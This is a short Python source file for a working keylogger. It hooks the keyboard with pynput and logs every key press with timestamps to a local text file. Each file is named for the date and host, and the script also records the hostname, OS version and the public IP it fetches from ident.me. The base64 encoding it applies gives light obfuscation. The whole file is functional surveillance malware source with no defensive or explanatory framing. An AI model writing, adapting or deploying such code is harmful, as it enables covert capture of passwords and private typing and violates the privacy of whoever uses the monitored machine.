#!/usr/bin/env python
###################################
# written by Dan Young 28/12/2020 #
###################################

# import our libraries
import pynput.keyboard
import base64
from datetime import datetime
import platform
import socket
import urllib.request

global log # set our log as global
EventDate = datetime.now()  # Time of event is now
pHostName = str(platform.node())
pPythonVersion = str(platform.python_version())
pPlatformVersion = str(platform.version())
str_EventDate = EventDate.strftime("%d/%m/%Y %H:%M:%S")  # Event date format for entries within log
str_LogDate = EventDate.strftime("%d-%m-%Y")  # Event date format for log filename
str_EventTimeNewLog = EventDate.strftime("%d/%m/%Y %H:%M:%S")
str_GetIP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
SaveFile = open(str(str_LogDate) + " KeyLogged " + "(" + pHostName + ").txt","a")  # Filename is date and keylogged.txt, append text file
SaveFile.write("\n" + "Logging Started @ " + str_EventTimeNewLog + " on " + pHostName + "(" + str_GetIP + "). Python Version: " + pPythonVersion + ". " + pPlatformVersion + ".")
SaveFile.close()

def process_key_press(keyboard_press):

    log = str(keyboard_press)  # Enter keyboard_press into log
    SaveFile = open(str(str_LogDate) + " KeyLogged " + "(" + pHostName + ").txt","a")  # Filename is date and keylogged.txt, append text file
    EncodedKeyPress = base64.b64encode(log.encode()) # Encode the log (key presses) into base64
    DecodedKeyPress = base64.b64decode(EncodedKeyPress.decode()) # Decode the log (key presses) from base64

    print(EncodedKeyPress) # write base64 to console
    print(DecodedKeyPress) # write decoded base64 to console
    print(log) # write text to console
    print(platform.node())
    print(platform.version())
    print(str_GetIP)
    SaveFile.write("\n" + str_EventDate + ": " + str(EncodedKeyPress) + " : " + str(DecodedKeyPress)) # write key presses to log file
    SaveFile.close() # close the stream

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()